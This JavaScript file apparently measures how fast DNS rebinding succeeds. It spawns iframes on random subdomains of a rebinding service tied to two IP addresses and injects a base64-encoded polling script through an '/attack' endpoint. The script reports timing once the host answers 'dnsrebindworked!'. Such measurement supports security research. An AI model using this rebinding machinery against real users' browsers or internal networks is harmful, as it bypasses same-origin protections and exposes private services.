function createScript(rebind, waitTime){
  return ` 
    var counter = 0
    var start = Date.now()

    var interval = setInterval(function(){
      var xhr = new XMLHttpRequest()
      xhr.open('GET', '${rebind}', false)
      xhr.send()

      counter++

      if(xhr.status == 200 && xhr.responseText.indexOf('dnsrebindworked!')>= 0){
        clearInterval(interval)
        window.parent.postMessage({
          waitTime: ${waitTime},
          duration: (Date.now() - start)/1000,
          requests: counter
        }, "*")
        return
      }

    }, ${waitTime})
  `
}

function start(){
  var sleepTime = document.getElementById('sleepTime').value
  var iframeCount = document.getElementById('iframeCount').value

  for(var i = 0; i < iframeCount; i++){
    createIframe(sleepTime)
  }
}

function createIframe(sleepTime){
  var id = Math.random().toString(36).substr(2, 9)
  var rebind = `http://${id}.81-4-124-10.45-55-45-223.rebind.43z.one`
  var script = createScript(rebind, sleepTime)

  var iframe = document.createElement('iframe')
  iframe.src = `${rebind}/attack?script=${btoa(script)}`
  iframe.width = 250
  iframe.height = 40

  document.getElementById('iframes').appendChild(iframe)
}

window.addEventListener("message", function(event){
  document.getElementById('log').innerHTML += `${JSON.stringify(event.data)}<br>`
}, false)
